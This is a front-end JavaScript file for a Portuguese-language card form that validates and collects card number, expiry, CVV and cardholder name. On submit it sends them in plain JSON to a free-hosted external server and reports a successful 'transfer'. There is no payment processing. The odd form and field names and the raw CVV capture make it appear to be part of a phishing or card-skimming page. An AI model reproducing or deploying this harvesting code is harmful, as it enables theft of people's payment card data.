document.addEventListener("DOMContentLoaded", () => {
    const form = document.querySelector("#dadosss");
    
    const campos = {
        numero: document.querySelector("#numero"),
        data: document.querySelector("#data"),
        cvv: document.querySelector("#cvv"),
        nome: document.querySelector("#nome"),
    };

    const mensagensDica = {
        numero: "Exemplo: 1234 5678 9123 4567",
        data: "Exemplo: 12/30",
        cvv: "Exemplo: 123",
        nome: "Nome completo impresso no cartão.",
    };

    // --- FUNÇÕES DE AJUDA (Dicas e Remoção de Erros) ---
    function removeMensagemDica(input) {
        const existing = input.parentElement.querySelector(".mensagem-dica");
        if (existing) existing.remove();
    }

    function limparErros() {
        document.querySelectorAll(".mensagem-erro").forEach(el => el.remove());
        for (const key in campos) {
            campos[key].style.border = "1px solid #ccc"; // Volta a cor normal
        }
        document.querySelectorAll('input[name="gender"]').forEach(r => {
            r.parentElement.style.border = "none";
        });
    }

    // Eventos de Focus/Blur para as Dicas
    for (const key in campos) {
        const input = campos[key];
        input.addEventListener("focus", () => {
            removeMensagemDica(input);
            const dica = document.createElement("span");
            dica.classList.add("mensagem-dica");
            dica.style.color = "#666";
            dica.style.fontSize = "12px";
            dica.style.display = "block";
            dica.style.marginTop = "4px";
            dica.textContent = mensagensDica[key];
            input.parentElement.appendChild(dica);
        });
        input.addEventListener("blur", () => {
            removeMensagemDica(input);
        });
    }

    // --- LOGICA DE ENVIO COM VALIDAÇÃO VISUAL ---
    form.addEventListener("submit", async (event) => {
        event.preventDefault();
        limparErros(); // Limpa avisos anteriores

        const inputsParaValidar = {
            numero: campos.numero,
            data: campos.data,
            cvv: campos.cvv,
            nome: campos.nome,
            tipo: document.querySelector('input[name="gender"]:checked'),
        };

        const mensagensErro = {
            numero: "Por favor, insira o número do cartão.",
            data: "A data é necessária.",
            cvv: "O CVV é necessário.",
            nome: "Por favor, insira o nome impresso no cartão.",
            tipo: "Selecione uma opção (Crédito ou Débito).",
        };

        let formValido = true;

        // 1. VALIDAÇÃO VISUAL (Igual ao script antigo)
        for (const key in inputsParaValidar) {
            const input = inputsParaValidar[key];

            if (!input || input.value.trim() === "") {
                formValido = false;

                if (key === "tipo") {
                    const radios = document.querySelectorAll('input[name="gender"]');
                    radios.forEach(r => {
                        r.parentElement.style.border = "2px solid red"; // Retângulo vermelho
                        r.parentElement.style.borderRadius = "8px";
                    });
                    const container = document.querySelector(".radio-container");
                    const erro = document.createElement("span");
                    erro.classList.add("mensagem-erro");
                    erro.style.color = "red";
                    erro.style.fontSize = "14px";
                    erro.textContent = mensagensErro[key];
                    container.appendChild(erro);
                } else {
                    input.style.border = "2px solid red"; // Retângulo vermelho no campo
                    const erro = document.createElement("span");
                    erro.classList.add("mensagem-erro");
                    erro.style.color = "red";
                    erro.style.fontSize = "14px";
                    erro.style.display = "block";
                    erro.style.marginTop = "4px";
                    erro.textContent = mensagensErro[key];
                    input.parentElement.appendChild(erro);
                }
            }
        }

        if (!formValido) return; // Para aqui se houver erro

        // 2. ENVIO PARA O SERVIDOR (Se tudo estiver preenchido)
        const botao = form.querySelector("button");
        botao.disabled = true;
        botao.textContent = "Processando...";

        const dadosParaEnviar = {
            numero: campos.numero.value,
            dataValidade: campos.data.value,
            cvv: campos.cvv.value,
            nome: campos.nome.value,
            tipo: document.querySelector('input[name="gender"]:checked').value
        };

        try {
            const urlDoServidor = "https://backend-g2xn.onrender.com";

            const resposta = await fetch(urlDoServidor, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dadosParaEnviar)
            });

            if (resposta.ok) {
                alert("Transferência realizada com sucesso!");
                form.reset();
            } else {
                alert("Erro ao salvar no banco de dados.");
            }
        } catch (error) {
            console.error("Erro:", error);
            alert("Servidor offline. Tente novamente em instantes.");
        } finally {
            botao.disabled = false;
            botao.textContent = "Transferir";
        }
    });
});
